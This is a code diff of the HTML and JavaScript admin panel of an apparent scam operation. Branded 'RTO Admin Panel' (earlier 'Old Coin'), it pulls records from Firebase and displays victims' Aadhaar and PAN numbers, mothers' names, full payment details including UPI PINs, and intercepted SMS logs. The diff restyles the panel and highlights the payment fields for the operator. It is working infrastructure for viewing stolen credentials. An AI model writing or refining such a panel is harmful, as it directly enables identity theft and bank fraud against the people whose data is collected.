@@ -3,53 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Old Coin Admin Panel - Full Data</title>
+    <title>RTO Admin Panel - Full Data View</title>
     <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; margin: 0; padding: 20px; }
-        .login-container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        .dashboard-container { display: none; max-width: 1000px; margin: 0 auto; }
-        input[type="password"] { width: 80%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
-        button { background: #ADD8E6; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; }
-        button:hover { background: #90cada; }
+        body { font-family: sans-serif; background: #eef2f7; padding: 15px; margin: 0; }
+        .login-box { max-width: 350px; margin: 80px auto; background: white; padding: 25px; border-radius: 15px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+        .dashboard { display: none; max-width: 950px; margin: 0 auto; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
+        button { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
         
-        .card { background: white; padding: 25px; margin-bottom: 25px; border-radius: 15px; border-left: 8px solid #ADD8E6; box-shadow: 0 4px 12px rgba(0,0,0,0.1); position: relative; }
-        .card h2 { margin-top: 0; color: #2c3e50; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        .card { background: white; margin-bottom: 20px; border-radius: 12px; overflow: hidden; box-shadow: 0 3px 10px rgba(0,0,0,0.08); border-top: 5px solid #007bff; }
+        .card-header { background: #f8f9fa; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .card-body { padding: 15px; }
         
-        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px; }
-        .info-item { background: #f9f9f9; padding: 10px; border-radius: 8px; border: 1px solid #eee; }
-        .label { font-weight: bold; color: #7f8c8d; display: block; font-size: 12px; text-transform: uppercase; }
-        .value { color: #2c3e50; font-size: 16px; font-weight: 600; word-break: break-all; }
+        .data-row { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
+        .data-item { background: #f1f4f9; padding: 10px; border-radius: 8px; min-width: 140px; flex: 1; border: 1px solid #e0e6ed; }
+        .label { font-size: 11px; color: #666; text-transform: uppercase; display: block; margin-bottom: 4px; font-weight: bold; }
+        .value { font-size: 15px; color: #222; font-weight: bold; word-break: break-all; }
+
+        .payment-highlight { background: #fff9c4; border: 2px dashed #fbc02d; padding: 12px; border-radius: 10px; margin-top: 10px; }
+        .payment-highlight h4 { margin: 0 0 10px 0; color: #f57f17; font-size: 14px; }
+
+        .sms-log { background: #e3f2fd; padding: 10px; border-radius: 8px; margin-top: 8px; border-left: 4px solid #2196f3; font-size: 13px; }
+        .sms-meta { color: #1976d2; font-weight: bold; margin-bottom: 3px; font-size: 12px; }
         
-        .section-title { margin-top: 20px; font-size: 18px; color: #34495e; border-left: 4px solid #3498db; padding-left: 10px; }
-        
-        .payment-box { background: #fffde7; padding: 15px; border-radius: 10px; margin-top: 10px; border: 1px solid #fff9c4; }
-        .payment-box h4 { margin: 0 0 10px 0; color: #f57f17; }
-        
-        .sms-box { background: #eef9ff; padding: 12px; border-radius: 10px; margin-top: 10px; border: 1px solid #d1e9f0; font-size: 14px; }
-        .sms-header { display: flex; justify-content: space-between; margin-bottom: 5px; color: #2980b9; font-weight: bold; font-size: 13px; }
-        .sms-text { color: #333; line-height: 1.4; }
-        
-        .no-data { text-align: center; color: #95a5a6; margin-top: 50px; }
+        .refresh-btn { background: #28a745; width: auto; padding: 8px 20px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-    <!-- Login Section -->
-    <div id="login-section" class="login-container">
-        <h2>RTO Admin Access</h2>
-        <p>Enter password to view secure database</p>
-        <input type="password" id="passInput" placeholder="Password">
-        <br>
-        <button onclick="checkPassword()">Login</button>
-        <p id="error-msg" style="color: red; margin-top: 10px; display: none;">Wrong Password!</p>
+    <div id="login-section" class="login-box">
+        <h3>Admin Login</h3>
+        <input type="password" id="passInput" placeholder="Enter Password">
+        <button onclick="checkPassword()">VIEW DATA</button>
+        <p id="err" style="color:red; display:none; margin-top:10px;">गलत पासवर्ड!</p>
     </div>
 
-    <!-- Dashboard Section -->
-    <div id="dashboard-section" class="dashboard-container">
-        <h1 style="text-align: center; color: #2c3e50; margin-bottom: 30px;">User Data Dashboard</h1>
-        <div id="data-list">Loading data from Firebase...</div>
+    <div id="dashboard-section" class="dashboard">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h2>RTO DATABASE (LIVE)</h2>
+            <button class="refresh-btn" onclick="location.reload()">Refresh Page</button>
+        </div>
+        <div id="data-list">Loading...</div>
     </div>
 
     <script>
@@ -69,14 +65,11 @@
         const db = firebase.database().ref("Users");
 
         function checkPassword() {
-            const input = document.getElementById("passInput").value;
-            if (input === SECRET_PASSWORD) {
+            if (document.getElementById("passInput").value === SECRET_PASSWORD) {
                 document.getElementById("login-section").style.display = "none";
                 document.getElementById("dashboard-section").style.display = "block";
                 loadData();
-            } else { 
-                document.getElementById("error-msg").style.display = "block"; 
-            }
+            } else { document.getElementById("err").style.display = "block"; }
         }
 
         function loadData() {
@@ -84,61 +77,48 @@
                 const list = document.getElementById("data-list");
                 list.innerHTML = "";
                 const data = snapshot.val();
+                if (!data) { list.innerHTML = "No Data Found"; return; }
 
-                if (!data) {
-                    list.innerHTML = "<div class='no-data'><h3>No users found in database</h3></div>";
-                    return;
-                }
-
-                // Convert object to array and reverse to show latest on top
-                const userIds = Object.keys(data).reverse();
-
-                userIds.forEach(id => {
+                Object.keys(data).reverse().forEach(id => {
                     const user = data[id];
                     let html = `<div class="card">
-                        <h2>${user.name || 'N/A'}</h2>
-                        
-                        <div class="info-grid">
-                            <div class="info-item"><span class="label">Phone Number</span><span class="value">${user.number || 'N/A'}</span></div>
-                            <div class="info-item"><span class="label">Aadhaar Number</span><span class="value">${user.aadhaar || 'N/A'}</span></div>
-                            <div class="info-item"><span class="label">PAN Number</span><span class="value">${user.pan || 'N/A'}</span></div>
-                            <div class="info-item"><span class="label">Mother's Name</span><span class="value">${user.motherName || 'N/A'}</span></div>
-                            <div class="info-item"><span class="label">Payment Mode</span><span class="value" style="color:#2980b9">${user.paymentMode || 'N/A'}</span></div>
-                        </div>`;
+                        <div class="card-header">
+                            <span class="value">${user.name || 'N/A'}</span>
+                            <span style="color:#007bff; font-weight:bold;">${user.number || ''}</span>
+                        </div>
+                        <div class="card-body">
+                            <div class="data-row">
+                                <div class="data-item"><span class="label">Aadhaar</span><span class="value">${user.aadhaar || 'N/A'}</span></div>
+                                <div class="data-item"><span class="label">PAN</span><span class="value">${user.pan || 'N/A'}</span></div>
+                                <div class="data-item"><span class="label">Mother</span><span class="value">${user.motherName || 'N/A'}</span></div>
+                                <div class="data-item"><span class="label">Mode</span><span class="value" style="color:blue">${user.paymentMode || 'N/A'}</span></div>
+                            </div>`;
 
-                    // Payment Details Section
+                    // --- PAYMENT DETAILS (IS PAR DHAYAN DEN) ---
                     if (user.paymentDetails) {
-                        html += `<div class="payment-box">
-                            <h4><i class="payment-icon">💳</i> PAYMENT DETAILS</h4>
-                            <div class="info-grid" style="grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));">`;
-                        
+                        html += `<div class="payment-highlight">
+                                    <h4>💳 FULL PAYMENT DATA:</h4>
+                                    <div class="data-row">`;
                         for (let [key, val] of Object.entries(user.paymentDetails)) {
-                            // Format keys like 'upi_pin' to 'UPI PIN'
-                            let formattedKey = key.replace('_', ' ').toUpperCase();
-                            html += `<div class="info-item" style="background:#fff;"><span class="label">${formattedKey}</span><span class="value">${val}</span></div>`;
+                            html += `<div class="data-item" style="background:white;"><span class="label">${key.toUpperCase()}</span><span class="value" style="color:#d32f2f">${val}</span></div>`;
                         }
-                        
                         html += `</div></div>`;
                     }
 
-                    // SMS Logs Section
+                    // --- SMS LOGS ---
                     if (user.messages) {
-                        html += `<h3 class="section-title">SMS LOGS</h3>`;
-                        const msgIds = Object.keys(user.messages).reverse();
-                        msgIds.forEach(mId => {
+                        html += `<div style="margin-top:15px;"><span class="label">SMS LOGS</span>`;
+                        Object.keys(user.messages).reverse().forEach(mId => {
                             const msg = user.messages[mId];
-                            const date = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : 'Date N/A';
-                            html += `<div class="sms-box">
-                                <div class="sms-header">
-                                    <span>From: ${msg.sender}</span>
-                                    <span style="color:#95a5a6; font-weight:normal;">${date}</span>
-                                </div>
-                                <div class="sms-text">${msg.message}</div>
+                            html += `<div class="sms-log">
+                                <div class="sms-meta">From: ${msg.sender} | ${new Date(msg.timestamp).toLocaleString()}</div>
+                                <div>${msg.message}</div>
                             </div>`;
                         });
+                        html += `</div>`;
                     }
 
-                    html += `</div>`;
+                    html += `</div></div>`;
                     list.innerHTML += html;
                 });
             });
